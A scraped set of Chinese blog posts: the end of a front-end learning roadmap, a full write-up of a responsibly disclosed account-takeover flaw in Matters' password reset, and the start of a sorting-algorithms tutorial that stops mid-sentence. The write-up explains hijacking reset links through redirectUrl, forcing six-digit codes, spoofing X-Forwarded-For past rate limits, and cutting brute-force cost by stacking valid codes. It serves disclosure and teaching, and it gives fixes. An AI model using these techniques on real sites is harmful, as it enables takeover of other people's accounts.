XSS，因為框架都幫你防掉了，你想入侵自己的網站都沒有辦法，就少了很多實測的樂趣。而且重點是哪天你一但脫離框架或者是錯誤地使用框架，很有可能產生出漏洞卻不自知，因為你沒有資訊安全的意識。 所以在這個部分，就是盡量讓自己寫出有漏洞的網站，然後自己試著入侵網站，看看是否能成功。成功以後就開始查詢修補方法，看看要怎麼補起來，這時候就會知道攻擊原理跟防禦手法，印象也會更深刻。 還有一個很重要的，密碼要記得 hash 過後才存到資料庫，拜託不要存明碼。 學習目標 知道雜湊與加密的差別 知道什麼是 SQL Injection 以及如何防範 知道什麼是 XSS 以及如何防範 知道什麼是 CSRF 以及如何防範 11. 學習後端框架 Express前面已經受過純 PHP 的折磨了，寫過夠多爛 code，也寫出夠多漏洞了，接下來我才會推薦你開始學框架。要學哪一個都行，但我推薦 Express，因為它比較輕量，而且使用的程式語言是 JavaScript。 這個部分的目標很簡單，就是體驗看看有框架與之前沒框架的差別，熟悉後端框架中的幾個元素（MVC 之類的）與整體架構。 對於網頁前端工程師，學 Express 還有一個好處，那就是以後想要做什麼 side project 都可以自己來，後端可以自己寫。這是很多前端工程師的煩惱，想要做 side project 可是卻不會後端，資料不知道從哪裡去抓，因此只能放棄。 如果有時間也可以去學一套 ORM，例如說 Sequelize，你會覺得跟之前 SQL query 比起來快很多也簡單很多。 但是請千萬要記住，像 Express 這種框架或者是 Sequelize 這些 ORM，背後都沒有什麼魔法。拆到最底層一樣是你之前在 PHP 裡面學到的那些基礎，解析 Request、拿取參數、返回 Response 與執行 SQL query 等等。 學到框架以後就可以拋棄純 PHP 了，以後都可以用框架來開發。因為你是個知道框架在幹嘛，也知道為什麼要用框架的開發者，而不是只會用框架，卻連 SQL query 都不會寫的人。 學習理由體驗有無框架的差別以及熟悉後端 MVC 架構，會更清楚有架構與沒有架構的差別。 學習目標 知道什麼是 MVC 知道什麼是 ORM 12. 後端部署既然都已經開始學後端了，那就把後端的流程全部跑完吧！接下來要學的東西是部署，你必須自己去租一台機器（AWS、Google Cloud 第一年都有一些優惠，沒有優惠的 DigitalOcean 最便宜的機器一個月也才五塊美金），然後把程式碼放上去。 還需要自己去買一個網域（Domain），並且學習 DNS 的設定，把網域對應到你買的機器。完成之後，就能夠擁有一個個人網站了，以後的作品集都可以放在自己的網站上。 學習理由這是學習路線裡面最後一個有關後端的部分了，之後的內容都不會再有後端。你可能會想說身為網頁前端工程師，有必要學這麼多後端嗎？ 你錯了，這些一點都不多，我覺得只是皮毛而已。後端的水一樣很深，我們學到的真的只是一些基礎，而這些後端概念是我認為許多前端工程師所欠缺的。 如同我前面說的一樣，網頁是由前端與後端組成，少了任何一邊都不夠完整。要你學這些後端不是為了讓你成為後端工程師，而是讓你在網頁出問題時能夠明確知道問題發生在哪裡。 學習目標 知道如何設定網域（A、CNAME） 知道如何用 SSH 遠端連線到自己的主機 知道怎麼部署自己寫好的程式 中場總結以上的東西全部學完以後，我覺得基礎就算 ok 了。以學到的東西來說，已經可以把任何看得到的網站實作出來。真心不騙，只是功能可能陽春一點，速度慢一點，但真的做得出來。 任何網站都是由底下這些基礎組合而成，括弧裡面是學到的對應的技術： 後端伺服器與商業邏輯（PHP + Apache） 資料庫（MySQL） 前端頁面與互動（HTML + CSS + JavaScript） 圖片來源：https://tw.beanfun.com/kartrider/img_newhand&#x2F;s01.jpg 不知道大家有沒有玩過跑跑卡丁車？反正就是一個賽車遊戲。現在的情況就是，你已經學會開車、學會甩尾以及單噴，也學了常見地圖的跑法，一定可以跑到終點，只是時間快慢而已。 所以接下來要學的東西都只有一個目的： 讓你跑得更快 13. jQuery 與 Bootstrap在前面的段落裡與前端相關的部分幾乎沒有提到任何一個 library，而接下來的推薦學習路線會出現許多的 library 以及工具。 第一個是鼎鼎大名的 jQuery。不用學到多厲害，基本的東西會用就好。我覺得 jQuery 還是挺好用的，而且是前端發展史上面非常重要的一環。 再來是 Bootstrap，只想入門的話我也覺得不難學，就按照官方文件把元件的 CSS 加上 class 就差不多了。總之它是個 UI library，可以幫助你把畫面變得更漂亮也更有一致性。 前面有說過基礎已經學的差不多了，接下來的內容都會專注在「如何跑得更快」，而這兩個 library 我認為就有符合這個條件，藉由 jQuery 以及 Bootstrap 來提升自己的開發速度。 學習理由學 jQuery 的理由是儘管它現在沒有那麼熱門了，但在小專案上面依然很好用，而且透過 jQuery 可以幫你減少一些原生很煩瑣的操作，節省時間。然後只是想要入門 jQuery 的話我覺得不用花多久時間，所以學一下比較好。 Bootstrap 的話則是能夠美化你的介面並且加速排版。 除了學新的工具以外，同時也是在訓練自己看文件的能力。今天你想要用 jQuery 來做 AJAX，應該要用哪個函式？想要套用 Bootstrap 的按鈕，class 應該怎麼用？這些都要透過 Google 或者是去官方文件查詢才會知道。看文件也是工程師的必備能力之一。 學習目標我覺得可以用這兩個東西寫出一個 TodoList 就沒問題了。 14. CSS 預處理器「跑得更快」的方法之一就是站在巨人的肩膀上，用著前輩們開發出來的好用工具，就能讓開發的速度更快，程式碼也更好維護。 而 CSS 預處理器就是這樣子的一個東西，可以讓你用像寫程式那樣子的方法來寫 CSS，可以定義變數、跑迴圈，甚至是呼叫函式。 知名的預處理器有 SaSS&#x2F;SCSS、Less 以及 Stylus 等等，這裡面隨便挑一套來學就好。會需要學這個是因為現在很少人直接寫 CSS 了，都是用 CSS 預處理器來編譯。 學習理由幫助你寫出更好維護的 CSS，同時也提高開發效率。 學習目標 了解 CSS 預處理器的目的以及原理 能夠把自己之前寫的 CSS 用任一預處理器改寫 15. 非同步歷程：callback、promise 與 async&#x2F;await在第八點「非同步與 AJAX」裡面就有學到了 Callback 的概念。由這個延伸出去可以學到 Promise，以及比較新的 async&#x2F;await 語法，這些都與非同步的概念息息相關。 學習理由在 JavaScript 裡面，理解這些東西的使用以及發展歷程我覺得是滿重要的事情，因此特地給這個主題一個段落，畢竟這些東西應該要是放在一起學習的。 要學的理由是 JavaScript 裡許多東西是非同步的，而現在幾乎都會用 Promise 來處理非同步的問題，要理解這些語法才能知道如何使用。 學習目標 知道如何使用 Promise 知道如何使用 .then 及 .catch 知道如何「同時」執行多個 Promise 知道如何「按照順序」執行多個 Promise 知道如何使用 async&#x2F;await 16. 深入理解 JavaScript 與瀏覽器相關機制在前面我們學了比較多的工具，使我們可以利用它們打造出自己的產品。但除了工具以外，背後的原理也是很重要的。學習原理以及一些比較底層的概念，會讓你對這些技術更有信心，在發生問題時你能想到的地方也更多。 舉例來說，有時候碰到的問題可能跟 JavaScript 本身沒有關係，而是瀏覽器的運行機制導致這樣的結果。如果完全都不知道瀏覽器做了什麼，那可能會一直糾結在「問題一定出在這邊！」，但事實上根本不是。 這邊推薦的學習資源是 How Browsers Work: Behind the scenes of modern web browsers，裡面可以看到現代瀏覽器的執行方式。 還有 Chrome 滿 20 歲時所推出的 Inside look at modern web browser 系列，都能夠大大增進你對於瀏覽器的理解。如果英文不好，上面這些文章都可以找到非官方的中文翻譯版本。 最後也推薦一堂 Google 在 Udacity 上開的課：Website Performance Optimization，裡面會提到瀏覽器解析 HTML 的過程以及載入資源的順序等等。 至於 JavaScript 的部分可以從一些常見的問題下手，例如說 closure、scope、this、hoisting 等等，都是常見的關鍵字。 這邊推薦俗擱大碗的 JavaScript: Understanding the Weird Parts，也推薦 You Don’t Know JS 以及我自己之前寫的五篇相關文章： 該來理解 JavaScript 的原型鍊了 深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？ 我知道你懂 hoisting，可是你了解到多深？ 所有的函式都是閉包：談 JS 中的作用域與 Closure 淺談 JavaScript 頭號難題 this：絕對不完整，但保證好懂 學習理由除了使用工具，你還要知道工具背後的原理是什麼。在發生問題時才能更精確地定位。 JavaScript 的部分我覺得對新手來說雖然有時候感受不出來，但它的確是重要的。很多時候新手會寫出相關的 bug 並踩到類似的問題，可是因為缺少了這些能力，所以不知道該如何找出問題在哪，也不知道怎麼 debug。 學習目標 知道什麼是作用域（Scope） 你知道 Hoisting（提升）是什麼 你知道 Hoisting 的原理為何 你知道 Closure（閉包）是什麼 你能夠舉出一個運用 Closure 的例子 你知道 Prototype 在 JavaScript 裡是什麼 你知道大部分情況下 this 的值是什麼 17. gulp 與 webpack當專案變得越來越大以後，可能就會需要一些工具來輔助開發。 gulp 能夠管理工作流程，可以用 gulp 來執行一系列的任務，例如說： 把 SCSS 轉成 CSS 壓縮 CSS 檔案 把 ES6 用 babel 轉成 ES5 壓縮 JS 檔案 把 HTML 裡面的圖片都換成 webp 格式 gulp 就只是個工作流程管理器而已，以上的功能都要額外安裝對應的 plugin 才能成功使用。 而 webpack 則是截然不同的東西，它是打包工具。以前瀏覽器原生並不支援在 Node.js 裡寫過的 import 與 export 這些語法（現在已經支援了），因此必須找一個打包工具來做這件事，webpack 的目的之一就是這個。 但除了這點以外，它把「打包」這件事情看得更廣，所有東西都是資源，不只有 JS 檔案。只要是資源都可以被 webpack 打包，在打包的過程中也可以透過 webpack 的 plugin 做一些事，例如說把 SCSS 轉成 CSS 或是壓縮 JS 檔案之類的。 會把兩個放在一起是因為這兩個常常被搞混，但我覺得可以很明顯看出他們本質上就是不同的。gulp 本身毫無作用，只是個任務管理員，真正的重點是底下執行了什麼任務；webpack 就是個打包工具，可以把你的前端專案打包起來，在打包過程可以順便利用 plugin 對資源做一些轉化。 如果你真的有理解這兩個東西，就會知道 webpack 也可以當作 gulp 的其中一個 task 來執行。 學習理由為什麼要學這兩個東西呢？gulp 我覺得其實不學也行，但概念不難而且門檻不高，學一下也是很不錯的。而且會常常跟 webpack 搞混，學一下之後比較能解釋跟 webpack 的異同。 真正的重點其實是 webpack，我認為理解 webpack 在幹嘛是進入現代前端開發的重點之一。因為那些前端框架幾乎都使用了 webpack 來打包，如果不學 webpack 的話，你就永遠搞不懂它們在幹嘛。 學習目標 知道 gulp 的目的以及原理 知道 webpack 的目的以及原理 熟悉如何使用 webpack 進行模組化開發 熟悉如何使用 gulp 建構自動化工作流程 18. 物件導向物件導向這個東西我真的不太知道要放在哪裡，只好放在框架前面了。 其實在前面的過程中就可以慢慢培養物件導向的概念，例如說使用 XMLHttpRequest 或是使用 Promise 的時候，就有物件導向的概念在裡面。 這邊需要去學習物件導向的基本概念，以及如何使用 ES6 的 Class 語法還有繼承。有時間的話也可以學 ES5 的 prototype，畢竟 JavaScript 是 prototype-based，Class 只是語法糖而已。 物件導向如果真的要學，可以學的東西很多，開始學的時候會先被一大堆新名詞給淹沒，但建議先學一些比較常見或是在 JavaScript 比較常用的就行了，像是繼承（Inheritance）跟封裝（Encapsulation）。 至於多型（Polymorphism）或是多載（Overloading）這些都可以先放著，稍微看一下有個概念就好，未來有機會的話再去深入學習。 學習理由下個部分要進入到前端框架了，在學習前端框架以前必須要有物件導向的觀念，不然有一大堆用法你會看不懂在幹嘛。 學習目標 知道什麼是 Class 知道 Class 與 Instance 的區別 知道什麼是 super() 知道如何使用 ES6 的 Class，能夠寫出簡單的物件導向程式 知道什麼是繼承（Inheritance） 19. React&#x2F;Vue&#x2F;Angular 三選一前面學了這麼多東西，這個學習路線也漸漸接近尾聲，終於到了學習前端框架的時候（React 嚴格來說不算是框架，但它跟整個生態系合起來我覺得算是一個框架，所以就稱它為框架了）。 在學習的部分，三大框架 React&#x2F;Vue&#x2F;Angular 可以選一套來學就好，Vue 好像比較容易上手，但我只會 React 而且我推薦 React。我完全沒用過其他兩套，推薦學 React 只是因為我比較喜歡它（對，是個很薄弱的理由）。 React 的學習資源我推薦從 React 小書開始，是我認為不可多得的資源，前四個 lesson 是精華，不直接教 React 卻讓你學會 React。看完之後可以看官方教學，內容也很豐富。 前端框架的部分要掌握核心概念以及基礎用法，以 React 來說，核心概念就是：state 對應到 UI，你要改變 UI，改變 state 就好。UI 只是 state 的呈現，所以基本上你不會直接動到 UI，而是改變 state，再讓 React 幫你重新繪製 UI。除此之外，Component 跟 JSX 也是滿重要的觀念，React 的幾個生命週期也必須好好搞懂。 總之呢，進入到現代的前端開發以後我覺得就差不多了。如果上面講的都有好好學的話，你在我心目中已經是個基礎不錯的網頁前端工程師了。 學習理由為什麼要把前端框架放那麼後面？ 因為我覺得學習這些前端框架是必須要有基礎的，沒有基礎的話只會死得很難看，根本不知道在學什麼。至少要能熟練的使用 JavaScript 以及理解物件導向，還要會一點基本的 webpack，最後才來學前端框架。 我認為框架本來就不是給新手用的東西，請先把基礎打好再來學框架，這樣才叫事半功倍。直接學框架是事倍功半，請一步一步來。有很多新手太早學框架，導致於碰到問題時不知道是框架的問題還是 JavaScript 本身的問題，這就會被我稱作是基礎不穩。 學習目標（以 React 為例） 知道 React 的目的以及原理 知道我們為什麼需要 React 知道使用 React 跟之前使用 jQuery 的區別 理解 state 跟 props 的不同 熟悉 React 基本操作 結語學的東西很多嗎？不少，但這只是個開始而已，還有很多主題我沒提到呢。 上面這些只是我認為的基礎而已，從每一項基礎都可以再延伸出許多更深入的議題，例如說 React 專案越來越大之後就會遇到一些狀態管理的問題，延伸出 Redux 以及一些 Redux middleware。 或者是 CSS 越寫也會越複雜，會接觸到一些 CSS 方法論如 OOCSS、SMACSS、BEM 以及 Functional CSS。 我還沒有提網頁效能優化呢，像是從伺服器端的 gzip、Cache、CDN、HTTP&#x2F;2 再到前端的 lazy loading、圖片壓縮、PRPL Pattern 或是 code splitting，有太多太多東西可以學習以及研究。 成為一個網頁前端工程師容易嗎？ 看你自己對這個職業的標準是什麼。如果你只是想要找到一份職稱為「網頁前端工程師」的工作的話，以現在的情況來說我覺得沒有很難。就如同我開頭所說的，若是以快速求職為導向，很多我提到的東西都不需要學。 但若是你想把基礎打得好一點，讓未來的自己能走得更順遂一點，那當然不是件容易的事。想要成為工程師很容易，但想要成為基礎紮實的工程師就是另外一回事了。 希望這份落落長的清單能對想要學習網頁前端或是想加強自己網頁前端基礎的人有幫助。 最後，感謝幫我先看過文章並給予建議的朋友們。","link":"/2019/08/21/real-front-end-learning-path/"},{"title":"有缺陷的重設密碼機制如何演變成帳號奪取漏洞？以 Matters 為例","text":"重設密碼是幾乎所有網站都有的機制，最常見的是透過 email 寄送一個重設密碼的連結，點進去連結以後就可以幫這個帳號設定新的密碼。這個機制雖然常見，卻有一些關於安全性的小細節要注意。 這次要來寫的，是我在今年六月底的時候回報的由重設密碼功能引起的帳號奪取（account takeover）漏洞。 Matters News 是一個去中心化而且應用加密貨幣相關技術的寫作社群平台，我以前曾經寫過一篇《防止 XSS 可能比想像中困難》分享我怎麼找到他們的 XSS 漏洞。 在談這次的漏洞之前，我們先來看看一般重設密碼的功能是如何設計的。 話說，如果你好奇為什麼密碼只能重設，而不是「找回密碼」，可以先參考這一篇：為什麼忘記密碼時只能重設，不把舊密碼告訴我？ 典型的重設密碼功能基本上忘記密碼的流程都大同小異，不外乎就是： 使用者填入當初註冊帳號時的 email 系統寄送重設密碼的連結到第一步的 email 使用者點擊信中的連結，前往重設密碼頁面 使用者輸入新的密碼，送出表單 密碼重設成功，使用者可以利用新的密碼登入 這個流程如果要是安全的，就必須確保： 系統寄送信件的目的地，真的是使用者本人的 email 重設密碼的連結無法被猜出來 先來談談第一點，有些人會想說：「這不是很基本嗎？我填入 &#117;&#115;&#x65;&#x72;&#x40;&#x65;&#x78;&#x61;&#x6d;&#x70;&#108;&#101;&#46;&#99;&#111;&#109;，當然是把信件寄送給 &#x75;&#x73;&#x65;&#114;&#x40;&#x65;&#x78;&#97;&#x6d;&#112;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d; 啊！」 不不不，這可不一定，有些系統在接收 email 這個參數時，居然可以是一個陣列，所以你可以填入：[&quot;victim@example.com&quot;, &quot;attacker@example.com&quot;]，然後 attacker 就會收到 victim 的重設密碼信件！ 聽起來很不可思議，但確實發生過： Ability to reset password for account Full account takeover of any user through reset password 再來談談第二點，如果重設密碼的連結可以被猜出來，就代表攻擊者可以代替 user 重設密碼。 或更精確地說，重設密碼的 token 不能被猜出來。 舉例來說，如果重設密碼的連結長得像這樣：https://example.com/reset-password?token=user@example.com，那我就可以幫任何人重設密碼了，顯然很不安全。 所以一般來說，token 都會產生一組 unique id，例如說 UUID v4，長得像這樣：2c59d26a-f99a-425e-bb69-91e7c6ffe54d，有 128 個 bit，也就是 2^128 種組合，要猜中的可能性微乎其微。 若是產生的 token 強度不夠的話，就會提高暴力破解成功的機率。 不過要特別注意的是儘管如此，有些系統的漏洞在其他地方，例如說寄送 email 時，重設密碼的網址或是 host 是可以控制的！像是只要在 request header 裡面加上 X-Forwarded-Host: abc.com，重設密碼的連結就會變成：https://abc.com/reset-password?token=...，使用者收到信以後如果不小心點了連結，這個 token 就會發到攻擊者的伺服器去，他一樣可以利用這個 token 來重設密碼，進行帳號奪取。 這也是有發生過實際案例的： Password Reset link hijacking via Host Header Poisoning Email link poisoning &#x2F; Host header attack 除了這些以外，其實還有許多小細節要注意，例如說： 重設密碼的 token 應該只能使用一次 重設密碼的 token 應該要有過期時間 如果使用者產生了新的重設密碼 token，舊的應該要廢棄 之所以會有這些限制，也是為了降低暴力破解的可行性。 假設時間無限的話，理論上暴力破解絕對可以猜出 token，因此防止暴力破解的重點有兩個，一個是盡量增加破解所需的時間，讓這個時間大到超過一千年或更久，第二個重點是限制時間，而實際的方法有幾種，例如說： 把基數加大，例如說六碼數字的可能性只有一百萬種，但若是換成六碼英文加數字就有 20 億種，要猜測的數量多了 2000 倍，就需要花更多時間 把可猜測的時間降低，例如說 300 秒後 token 就會過期，假設可能性有 1 億種，那每秒必須要猜 30 萬種才能保證猜中 接著，我們就來看一下 Matters 的重設密碼機制出了什麼事情。 Matters 的重設密碼機制下圖是 Matters 重設密碼的畫面，一樣是填入 email，然後寄一個連結到信箱： 重設密碼的 request 長這樣： &#123; \"operationName\":\"SendVerificationCode\", \"variables\":&#123; \"input\":&#123; \"email\":\"user@example.com\", \"type\":\"password_reset\", \"redirectUrl\":\"https://matters.news/forget?email=user%40example.com\" &#125; &#125; &#125; 這是我收到的連結：https://matters.news/forget?email=user%40example.com&amp;code=UYBQ912rhd_9s3TfywZnk1kQl6PCaDjPlXuNX3Df&amp;type=password_reset 從這邊其實我們就可以發現第一個問題，就是看起來收到的連結的前半段是由 redirectUrl 所控制的。如果我們攔截 request 以後修改 redirectUrl 參數，修改成 https://cymetrics.io，會發現信箱內收到的連結確實變成由 https://cymetrics.io 開頭！ 如此一來，就有了前面所說的漏洞，如果使用者點了信中的連結，那我們的 server 就會收到 token，就可以幫使用者重設密碼。 接著我們看一下有沒有暴力破解的問題，token 本身看起來複雜度滿高的，長度是 40 個字，由大小寫英文字母、數字以及底線所組成。 雖然看起來應該不會有問題，但 Matters 是開源的，所以我們可以直接去看一下 SendVerificationCode 是如何實作的，程式碼在這邊：https://github.com/thematters/matters-server/blob/v3.19.0/src/mutations/user/sendVerificationCode.ts 我們關注的是產生 code 的地方，主要是這一段： // insert record const &#123; code &#125; = await userService.createVerificationCode(&#123; userId: viewer.id, email, type, strong: !!redirectUrl, // strong random code for link &#125;) 而這個 userService.createVerificationCode 的程式碼則是在這裡：https://github.com/thematters/matters-server/blob/v3.19.0/src/connectors/userService.ts#L1500 createVerificationCode = (&#123; userId, email, type, strong, expiredAt, &#125;: &#123; userId?: string | null email: string type: string strong?: boolean expiredAt?: Date &#125;) => &#123; const code = strong ? nanoid(40) : _.random(100000, 999999) return this.baseCreate( &#123; uuid: v4(), userId, email, type, code, expiredAt: expiredAt || new Date(Date.now() + VERIFICATION_CODE_EXIPRED_AFTER), &#125;, 'verification_code' ) &#125; 從這邊我們看到一個重點，就是在系統內 code 的產生分兩種類型，strong 的是 nanoid(40)，不 strong 的則是 100000~999999 的六碼數字，而這個 strong 的參數是由有沒有傳入 redirectUrl 而決定的。 也就是說，如果我們在建立 reset password 的驗證碼時把 redirectUrl 參數拿掉，code 就會從原本的 40 個字，瞬間降低成六位數的數字！ 而驗證碼的過期時間 VERIFICATION_CODE_EXIPRED_AFTER 是五分鐘，也就是 300 秒，900000&#x2F;300 &#x3D; 3000，只要我們一秒能發送 3000 個 request 到 server，就能暴力破解 reset password 的 token，進而奪取使用者帳號。 但其實這樣的說法不太精確，因為我們可以發 3000 個，不代表 server 就可以處理 3000 個，所以還要看 server 能接受的 request 數量，而且在這之前，還有另一個限制要繞過。 Rate limiting增加暴力破解難度的方法之一就是 rate limiting，許多網站或是 WAF 都有這個功能，能夠阻止短時間內大量的 request。 而 Matters 的 rate limit 是用 nginx 來處理，程式碼在這裡：https://github.com/thematters/matters-server/blob/v3.19.0/.ebextensions/rate-limit-connections.config limit_req_zone $http_x_forwarded_for zone&#x3D;application:16m rate&#x3D;5r&#x2F;s; limit_req zone&#x3D;application burst&#x3D;20 nodelay; limit_req_status 429; limit_conn_status 429; # pass real IP from client to NGINX real_ip_header X-Forwarded-For; set_real_ip_from 0.0.0.0&#x2F;0; server &#123; # set error page for HTTP code 429 error_page 429 @ratelimit; location @ratelimit &#123; return 429 &#39;[&quot;Connection Limit Exceeded&quot;]\\n&#39;; &#125; listen 80; # 底下省略 &#125; nginx 的 rate limit 基本上都是以 IP 為主，如果真的想繞過的話可以嘗試看看 IP rotate，一個簡單的方式是去 AWS 上開很多 API gateway 當 proxy，然後你就有了一堆不同的 IP 可以輪流使用。 但這邊還用不上這個技巧，因為在設定中可以看到它使用了 $http_x_forwarded_for 這個參數，如果沒有管理好的話，可以自己傳入 X-Forwarded-For 來偽造任意 IP，藉此繞過 rate limit 的限制。 而 Matters 在這邊顯然沒有設置好，因此 rate limit 算是虛設。 做到這邊，只要我們能夠一秒發送 3000 個 request 就能做出 POC，證明攻擊確實可行，但還有沒有其他的方法，能讓這個數字再小一點呢？ 同時存在的驗證碼在開頭的時候有提過重設密碼有一些小細節要注意，像是： 重設密碼的 token 應該只能使用一次 重設密碼的 token 應該要有過期時間 如果使用者產生了新的重設密碼 token，舊的應該要廢棄 而 Matters 前兩點都做了，就是唯獨第三點沒有做好。從程式碼中我們可以看出當新的驗證碼建立時，舊的並不會刪除或是標記為廢棄。 這會有什麼影響呢？我們來算個簡單的數學吧！ 驗證碼的組合總共有 900,000 種，我們有 300 秒的時間可以攻擊，如果可以在這段時間內發送 900,000 個 request 而且 server 也有處理，就一定可以猜到重設密碼的驗證碼。 若是我們改成先不要猜，而是先發送 1000 次的重設密碼請求，因為舊的驗證碼依然有效，所以這時我們猜一次，猜中任何一組的機率就是 1000&#x2F;900000 &#x3D; 1&#x2F;900，變成原本的 1000 倍。 猜 1000 次的話，猜中的機率就是「1 - 每次都猜不中的機率」，大約是 1 - (899/900)^1000 &#x3D; 67%，如果猜到 5000 次的話，猜中的機率就是 1 - (899/900)^5000 &#x3D; 99.6%。 也就是說，我們只要發送 1000 個重設密碼的請求外加 5000 個確認驗證碼的請求，總共 6000 個請求，就有 99.6% 的機率可以正確猜到至少一組驗證碼！ 可以寫個簡單的小程式來驗證我們的機率計算： const _ = require('lodash') const rounds = 100000 // 跑十萬輪取平均 const guessRounds = 5000 // 猜 5000 次 const tokenCount = 1000 // 1000 個合法驗證碼 let winCount = 0 for(let r=0; r&lt;rounds; r++) &#123; let ans = &#123;&#125; for(let i=0; i&lt;tokenCount; i++) &#123; ans[_.random(100000, 999999)] = true &#125; let isWin = false for(let i=0; i&lt;guessRounds; i++) &#123; const guessNumber = _.random(100000, 999999) if (ans[guessNumber] === true) &#123; isWin = true break &#125; &#125; if (isWin) winCount++ &#125; console.log(winCount*100 / rounds) // 輸出：99.626，我們算出的機率差不多 原本要發 900,001 個 request 才能有 100% 的機率可以猜中，現在只要犧牲一點點正確性，變成 99.6% 的機率猜中，就可以把 request 數量降低到 6000 次，低了 150 倍！ 原本我們在五分鐘內一秒要發 3000 個 request，現在一秒只要 20 個 request 就好（其實這邊也只是大略計算，因為是有順序性的，必須要等 1000 個發送驗證碼的 request 結束後才能開始猜，而這 1000 個可能又會花個幾秒，但這邊為了方便計算先忽略不計，對整體的影響不大） 就因為這個重設密碼的小缺陷，沒有把上一組驗證碼淘汰掉，導致我們可以產生多組驗證碼，大幅降低暴力破解的難度。只要能在五分鐘內發送 6000 個 request，就有 99.6% 的機率可以更改一組帳號的密碼。 由於這是重設密碼功能，所以改完密碼之後你就可以直接用他的身份登入系統，達成帳號奪取，把其他人的帳號都變成是你的。如果想要擴大影響性的話，可以奪取管理員的帳號，就有機會進入管理後台進行更多操作。 建議修補方式第一個要修的地方是重設密碼的小缺陷，在使用者產生新的驗證碼時，舊的應該要被淘汰掉，保證永遠只有最新的一組可以通過驗證，這樣攻擊者猜中的機率就永遠是 1&#x2F;n，而不會像上面的範例那樣，可以把機率提高 1000 倍或更多倍。 第二個則是驗證碼的產生不該由 redirectUrl 參數來決定，而是應該由驗證碼的 type 來決定，如果是 reset password，就一定要是 strong，這樣子就會用 nanoid(40) 來產生，猜中的機率就變得微乎其微，大幅降低暴力破解的可行性。 第三個是 redirectUrl 不應該從前端傳入，而是直接把網址寫在後端。如果真的要從前端傳入，那後端要做好完善的檢查，確保 redirectUrl 傳入的是合法的路徑，而不是讓攻擊者可以傳入任意網址（不過如果攻擊者能結合 open redirect，又是另外一回事了） 最後一個則是 nginx 的 rate limit 限制不應該用 X-Forwarded-For 來決定，就算真的要用這個，也要確保它的值無法由攻擊者自行傳入。 總結重設密碼機制看似簡單，但其實一不小心還是有可能做出有漏洞的機制，導致攻擊者有機可趁，在 HackTricks 上有個頁面專門在講 reset password 可能會有的問題：Reset&#x2F;Forgotten Password Bypass，除了這篇提到的以外還有更多的問題，整理得很詳細，很值得參考看看。 如果你以為只有一般的網站會有這種問題，那你就錯了。一名資安研究員 Laxman Muthiyah 發現可以用 concurrent 的方式繞過 Instagram 的 rate limiting，成功發送 200 個 request，並且用 1000 台機器產生出 20 萬個 request，就有 20% 的機率攻擊成功。 只要有 5000 台機器，就能拿下任何帳號。5000 台聽起來很多，成本應該很高對吧？但如果善用 cloud service 的話，他估算可能只需要 150 美金左右即可達成一次攻擊（因為算小時收費，只要開一兩個小時即可） 而他也在去年七月用同樣的手法繞過微軟的 rate limiting，並且拿到 5 萬美金的獎金。 像這種漏洞如果能成功被利用，就能夠直接奪取他人的帳號，影響很大，需要多加注意相關的安全性。看到這裡，大家不妨也檢查一下自家的重設密碼機制是否安全。 最後，這次找到漏洞以後一樣有回報給 Matters，底下是完整時間軸： 2021-06-24 回報漏洞給 Matters2021-06-25 收到 Matters 回覆，確認漏洞存在2021-08-20 Matters 修復部分功能，產生新的驗證碼時會淘汰舊的2021-08-26 Matters 確認漏洞評級為 High，獎金為 150 USD2021-10-28 關心後續修復狀況，確認是否修補完畢2021-11-30 Matters 增強 non-strong 的驗證碼基數2021-12-02 文章初稿完成，與 Matters 確認是否可發布2021-12-21 Matters 確認問題已修復完畢以及可發布文章","link":"/2022/01/04/reset-password-vulnerability/"},{"title":"一起用 JavaScript 來複習經典排序法吧！","text":"前言最近剛好上到 CS50 Week3，這一週的主題是：Algorithms，裡面介紹到了幾種經典的排序法，像是選擇排序、泡沫排序、插入排序以及合併排序。 我覺得身為一個軟體工程師，大概一輩子都脫離不了排序了，畢竟這是經典演算法之一嘛！與其每次要面試之前都凌亂的準備，不如現在就整理出一篇，紀錄一下各個排序法的心得，幫自己做個統整。 因此，這一篇將利用 JavaScript 來實作各個經典排序演算法。 這次實做的排序法都會是由小到大排序，並且為了方便起見，每一個排序法「都會直接更改原本的 array」，但如果你不想改到原本的也很簡單，在每一個的函式最開頭加上：arr = arr.slice()複製一份原本的即可。 還有，因為文章裡面比較難放動畫，所以我只能放一些圖片而已，若是想搭配視覺化演算法一起學習的話，我非常推薦 VISUALGO，這網站絕對會讓你對排序的理解度更上一層樓。 選擇排序法（Selection Sort）選擇排序是我認為最好理解的排序法，因為它的原理超級簡單： 找到最小值，移到最左邊。 當你第一輪跑完之後，你就找到整個陣列的最小值了，然後你把尋找範圍從 0 ~ n-1 變成 1 ~ n-1，重複做一樣的事情就可以了。或是，你也可以想成是：找到最小值，第二小值，第三小值…第 n 小值。 （圖片來源：http://cheetahonfire.blogspot.sg/2009/05/selection-sort-vs-insertion-sort.html ） const selectionSort = (arr) => &#123; const length = arr.length; // 有幾個元素，就要找幾輪的最小值 // 這邊的 i 代表 i 以前的元素都排序好了 for (let i = 0; i &lt; length; i++) &#123; // 先預設第一個是最小的 let min = arr[i]; let minIndex = i; // 從還沒排好的元素開始找最小值 for (let j = i; j &lt; length; j++) &#123; if (arr[j] &lt; min) &#123; min = arr[j]; minIndex = j; &#125; &#125; // ES6 的用法，交換兩個數值 [arr[minIndex], arr[i]] = [arr[i], arr[minIndex]]; &#125; return arr; &#125; 時間複雜度就是大家所熟知的 O(n^2)，最好、最壞、平均都是一樣的，因為無論原本的陣列長怎樣，都要經過這麼多輪比較。 泡沫排序法（Bubble Sort）泡沫排序應該是很多人第一個接觸的排序法，原理也很簡單好懂： 跟隔壁互相比較，順序錯了就交換，讓大的元素一直浮到最後 就是這樣交換的過程，才讓它稱為「泡沫」排序法，因為元素很像「浮」了上來。 （圖片來源：http://www.opentechguides.com/how-to/article/c/51/bubble-sort-c.html ） const bubbleSort = (arr) => &#123; const n = arr.length; // 一共要跑 n 輪 for (let i = 0; i &lt; n; i++) &#123; // 從第一個元素開始，不斷跑到第 n - 1 - i 個 // 原本是 n - 1，會再加上 - i 是因為最後 i 個元素已經排好了 // 所以沒必要跟那些排好的元素比較 for (let j = 0; j &lt; n - 1 - i; j++) &#123; if (arr[j] > arr[j + 1]) &#123; [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]]; &#125; &#125; &#125; return arr; &#125; 雖然泡沫排序法的平均跟最壞時間複雜度都是O(n^2)，但值得注意的是 best case，出現在輸入的陣列已經是排序好的情況下。在這種情況下呢，時間複雜度是 O(n)，不會做任何的交換。 但是呢，如果你要做到最優的情形是 